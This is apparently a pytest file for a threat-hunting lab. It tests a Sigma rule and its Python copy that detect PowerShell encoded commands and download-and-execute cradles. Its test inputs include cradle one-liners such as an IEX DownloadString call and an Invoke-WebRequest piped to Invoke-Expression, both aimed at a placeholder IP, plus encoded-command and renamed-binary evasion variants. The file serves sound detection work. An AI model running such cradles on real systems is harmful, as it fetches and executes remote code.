"""Tests for the Sigma rule in detections/ (Milestone 3)."""

import re
from pathlib import Path

import pytest
import yaml
from sigma.backends.elasticsearch import EqlBackend
from sigma.collection import SigmaCollection
from sigma.pipelines.elasticsearch.windows import ecs_windows

from threathunt_lab.detection import (
    DOWNLOAD,
    ENCODED_FLAGS,
    IMAGE_ENDSWITH,
    INVOKE,
    ORIGINAL_FILE_NAMES,
    detect,
)

DETECTIONS = Path(__file__).resolve().parents[1] / "detections"
RULE = DETECTIONS / "sigma" / "powershell_encoded_or_download_cradle.yml"
DOC = DETECTIONS / "D001-powershell-encoded-or-download.md"


def load_rule():
    # Raises an error if the YAML is not a valid Sigma rule.
    return SigmaCollection.from_yaml(RULE.read_text(encoding="utf-8"))


def test_rule_is_valid_sigma():
    rules = load_rule()
    assert len(rules.rules) == 1
    assert rules.rules[0].title == "PowerShell Encoded Command or Download and Execute"


def test_doc_shows_the_real_eql_conversion():
    # The EQL query in the write-up must be exactly what sigma-cli produces.
    converted = EqlBackend(ecs_windows()).convert(load_rule())[0]
    documented = re.search(r"```eql\n(.*?)\n```", DOC.read_text(encoding="utf-8"), re.DOTALL).group(1)
    assert documented == converted


# --- The Python copy of the rule (detection.py) --------------------------------


def test_python_copy_matches_the_sigma_rule():
    # If someone edits the Sigma file but not detection.py (or the other way
    # round), this test fails, so the two can't drift apart.
    detection = yaml.safe_load(RULE.read_text(encoding="utf-8"))["detection"]
    assert detection["selection_img"] == [
        {"Image|endswith": IMAGE_ENDSWITH},
        {"OriginalFileName": ORIGINAL_FILE_NAMES},
    ]
    assert detection["selection_encoded"] == {"CommandLine|windash|contains": ENCODED_FLAGS}
    assert detection["selection_download"] == {"CommandLine|contains": DOWNLOAD}
    assert detection["selection_invoke"] == {"CommandLine|contains": INVOKE}
    assert detection["condition"] == (
        "selection_img and (selection_encoded or (selection_download and selection_invoke))"
    )


POWERSHELL_PATH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def powershell_event(make_event, command_line, executable=POWERSHELL_PATH):
    event = make_event()
    event["process"]["executable"] = executable
    event["process"]["command_line"] = command_line
    return event


@pytest.mark.parametrize(
    "command_line",
    [
        "powershell.exe -enc AAAA",
        "powershell.exe -e AAAA",
        "powershell.exe -ec AAAA",
        "powershell.exe -EncodedCommand AAAA",
        "POWERSHELL.EXE -NoP -W Hidden -eNc AAAA",  # mixed case
        "powershell.exe /enc AAAA",  # slash instead of dash
        "powershell.exe \u2013enc AAAA",  # en dash
        "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.1/a')",
        "powershell.exe Invoke-WebRequest http://192.0.2.1/a | Invoke-Expression",
    ],
)
def test_detects_encoded_and_download_commands(make_event, command_line):
    assert detect(powershell_event(make_event, command_line))


@pytest.mark.parametrize(
    "command_line",
    [
        "powershell.exe Get-Content C:\\q4-encryption-audit.txt",  # -enc inside a file name
        "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\a.ps1",  # starts with -e, but isn't -e
        "powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Scripts\\a.ps1",  # hidden window only
        "powershell.exe (New-Object Net.WebClient).DownloadString('http://192.0.2.1/a')",  # download, no IEX
        "powershell.exe -NoLogo",
    ],
)
def test_ignores_normal_or_lookalike_commands(make_event, command_line):
    assert not detect(powershell_event(make_event, command_line))


def test_pwsh_is_powershell(make_event):
    event = powershell_event(make_event, "pwsh.exe -enc AAAA", "C:\\Program Files\\PowerShell\\7\\pwsh.exe")
    assert detect(event)


def test_renamed_powershell_needs_original_file_name(make_event):
    event = powershell_event(make_event, "svcupdate.exe -enc AAAA", "C:\\Users\\Public\\svcupdate.exe")
    assert not detect(event)  # missed: the name isn't PowerShell (like thl-evt-0016)

    # Real telemetry (Sysmon, Elastic Defend) has the file's original name.
    event["process"]["pe"] = {"original_file_name": "PowerShell.EXE"}
    assert detect(event)


@pytest.mark.parametrize(
    "broken",
    [
        lambda e: e["process"].pop("command_line"),  # missing field
        lambda e: e["process"].pop("executable"),
        lambda e: e.pop("process"),  # whole object missing
        lambda e: e["process"].update(command_line=None),  # wrong type
        lambda e: e["process"].update(executable=["not", "text"]),
    ],
)
def test_missing_or_broken_fields_do_not_crash(make_event, broken):
    event = powershell_event(make_event, "powershell.exe -enc AAAA")
    broken(event)
    assert detect(event) is False
